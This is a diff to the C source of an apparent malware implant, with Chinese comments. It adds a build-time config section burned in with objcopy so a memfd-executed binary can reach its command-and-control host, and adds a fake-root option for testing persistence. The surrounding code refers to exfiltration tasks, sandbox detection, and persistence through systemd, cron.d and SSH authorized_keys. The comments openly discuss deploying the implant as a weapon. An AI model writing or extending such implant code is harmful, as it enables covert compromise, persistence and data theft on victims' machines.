@@ -63,10 +63,36 @@
 #include "exfil_task.h"
 #include "exfil_task_link.h"
 #include "cover_loop.h"
+#include "mono_embed.h"
 
 /* ====================================================================
  * 配置
  * ==================================================================== */
+
+/* 构建期烧录配置。
+ *
+ * 为什么必须有这一层：制品是经 memfd 执行的，stager 用空 argv/空 envp
+ * 启动它（不继承投递来源的环境，也不接受外部参数）。若没有烧录配置，
+ * 植入体只能连构建期默认的 127.0.0.1:8443 —— 真实部署下那不是 C2，
+ * 且 persist_root 为空会写宿主真实 /etc/cron.d，等于拿测试默认值当武器用。
+ *
+ * 落在一个独立 section 里，由 objcopy --update-section 在打包前写入。
+ * magic 无效（全零）即视为"未烧录"，回落命令行与默认值 —— 这样同一份
+ * 二进制既能裸跑（开发）也能烧录后投送（部署）。 */
+/* 构建期烧录配置。
+ *
+ * 为什么必须有这一层：制品是经 memfd 执行的，stager 用空 argv/空 envp
+ * 启动它（不继承投递来源的环境，也不接受外部参数）。若没有烧录配置，
+ * 植入体只能连构建期默认的 127.0.0.1:8443 —— 真实部署下那不是 C2，
+ * 且 persist_root 为空会写宿主真实 /etc/cron.d，等于拿测试默认值当武器用。
+ *
+ * 落在一个独立 section 里，由 objcopy --update-section 在打包前写入。
+ * magic 无效（全零）即视为"未烧录"，回落命令行与默认值 —— 这样同一份
+ * 二进制既能裸跑（开发）也能烧录后投送（部署）。
+ *
+ * 结构定义与 embedcfg 工具共用 mono_embed.h，禁止在此另写一份。 */
+__attribute__((used, section(".mono_cfg")))
+static mono_embed_t g_embed;
 
 typedef struct {
     uint8_t  psk[32];
@@ -84,8 +110,49 @@ typedef struct {
     int      allow_sandbox;   /* 自检命中沙箱时不退出（仅测试用） */
     int      fast;            /* 快速调度：缩短采集间隔，供自测使用 */
     char     src[256];        /* 采集源：文件路径；空则合成帧 */
+    char     persist_root[256];/* 持久化假根；空串=写真实根（部署语义） */
     int      verbose;
 } mono_cfg_t;
+
+/* 定长字段拷贝：源可能无 NUL 终止，故先 strnlen 求长度再拷。
+   源为空串时不改动目标（保留默认/命令行值）。 */
+static void copy_fixed(char *dst, size_t dcap, const char *src, size_t scap)
+{
+    size_t n;
+    if (!dst || !src || !dcap || !scap) return;
+    n = strnlen(src, scap);
+    if (n == 0) return;
+    if (n >= dcap) n = dcap - 1;
+    memcpy(dst, src, n);
+    dst[n] = '\0';
+}
+
+/* 应用烧录配置：magic/ver 不符即视为未烧录，一项都不改。
+ * 只覆盖"烧录时显式填了"的字段（非零/非空），未填的留给默认值。
+ * 命令行在它之后解析，因此命令行可覆盖烧录值 —— 仅测试需要。 */
+static void cfg_apply_embed(mono_cfg_t *c)
+{
+    const mono_embed_t *e = &g_embed;
+    if (e->magic != MONO_EMBED_MAGIC) return;
+    if (e->ver != MONO_EMBED_VER) return;
+
+    /* 用 strnlen 而非 %s：烧录段的字段是定长 char[N]，可能没有 NUL 终止。
+       snprintf 虽保证目标 NUL 终止，但会触发 -Wformat-truncation；
+       这里显式取长度再拷，既不告警也不依赖源是否终止。 */
+    copy_fixed(c->host, sizeof c->host, e->host, sizeof e->host);
+    copy_fixed(c->implant_id, sizeof c->implant_id, e->id, sizeof e->id);
+    copy_fixed(c->persist_root, sizeof c->persist_root,
+               e->persist_root, sizeof e->persist_root);
+    if (e->port) c->port = e->port;
+    if (e->run_ms) c->run_ms = e->run_ms;
+    if (e->period_ms) c->period_ms = e->period_ms;
+    if (e->budget_bpm) c->budget_bpm = e->budget_bpm;
+    if (e->flags & MONO_EMBED_FLAG_ALLOW_SANDBOX) c->allow_sandbox = 1;
+    if (e->psk_len && e->psk_len <= sizeof c->psk) {
+        memcpy(c->psk, e->psk, e->psk_len);
+        c->psk_len = e->psk_len;
+    }
+}
 
 static void cfg_default(mono_cfg_t *c)
 {
@@ -511,11 +578,14 @@ static int implant_run(int cmd_fd, int data_fd, const mono_cfg_t *cfg,
     memcpy(pfx_data, tsc + 8, 8);
 
     /* 持久化：确保重启后驻留。幂等；已驻留返回 1，首次安装返回 0。
-     * root_prefix 传 NULL 即写真实根（部署语义）。 */
+     * persist_root 为空串时传 NULL，即写真实根（部署语义）。
+     * 非空时写到假根——这是 end-to-end 生命周期验证的前提：
+     * 硬编码 NULL 会让驻留只能在真机上验证，要么不敢测、要么污染宿主。 */
     {
         char binp[512];
         int meth[3];
-        int pr = persist_linux_ensure(NULL, binp, sizeof binp, meth, 3);
+        const char *proot = cfg->persist_root[0] ? cfg->persist_root : NULL;
+        int pr = persist_linux_ensure(proot, binp, sizeof binp, meth, 3);
         if (cfg->verbose)
             fprintf(stderr, "[implant] persistence ensure rc=%d bin=%s "
                     "(systemd=%d cron=%d sshkey=%d)\n",
@@ -1025,7 +1095,8 @@ static void usage(const char *p)
     fprintf(stderr,
         "usage: %s [--server|--selftest|--check] [--host IP] [--port N]\n"
         "          [--psk-hex HEX] [--id STR] [--src PATH] [--run-ms N]\n"
-        "          [--budget N] [--period N] [--allow-sandbox] [--quiet]\n", p);
+        "          [--budget N] [--period N] [--persist-root DIR]\n"
+        "          [--allow-sandbox] [--quiet]\n", p);
 }
 
 int main(int argc, char **argv)
@@ -1038,6 +1109,7 @@ int main(int argc, char **argv)
 
     signal(SIGPIPE, SIG_IGN);
     cfg_default(&cfg);
+    cfg_apply_embed(&cfg);   /* 烧录值先于命令行：命令行仅在测试时覆盖 */
 
     for (i = 1; i < argc; i++) {
         if (!strcmp(argv[i], "--server")) mode = 1;
@@ -1059,6 +1131,9 @@ int main(int argc, char **argv)
             cfg.budget_bpm = (uint32_t)strtoul(argv[++i], NULL, 10);
         else if (!strcmp(argv[i], "--period") && i + 1 < argc)
             cfg.period_ms = (uint32_t)strtoul(argv[++i], NULL, 10);
+        else if (!strcmp(argv[i], "--persist-root") && i + 1 < argc)
+            snprintf(cfg.persist_root, sizeof cfg.persist_root, "%s",
+                     argv[++i]);
         else if (!strcmp(argv[i], "--psk-hex") && i + 1 < argc) {
             const char *h = argv[++i];
             size_t n = 0;
@@ -1093,6 +1168,14 @@ int main(int argc, char **argv)
     if (mode == 2) {
         int r;
         cfg.fast = 1;   /* 自测必须秒级返回，不得依赖默认 1 秒采集间隔 */
+        /* 自测绝不污染宿主：未显式指定假根时自动用临时假根。
+           否则每跑一次回归就在真实 /etc/cron.d、/etc/systemd/system、
+           /var/tmp/.dayanjing 与 ~/.ssh/authorized_keys 留下条目，
+           而那些条目指向一个测试二进制 —— 既弄脏机器，也让"驻留是否生效"
+           的判据失去意义（真实系统里早就有上一次的残留）。 */
+        if (!cfg.persist_root[0])
+            snprintf(cfg.persist_root, sizeof cfg.persist_root,
+                     "/tmp/mono_selftest_root");
         r = run_selftest(&cfg);
         if (cfg.verbose)
             fprintf(stderr, "[selftest] rc=%d %s\n", r, r == 0 ? "PASS" : "FAIL");
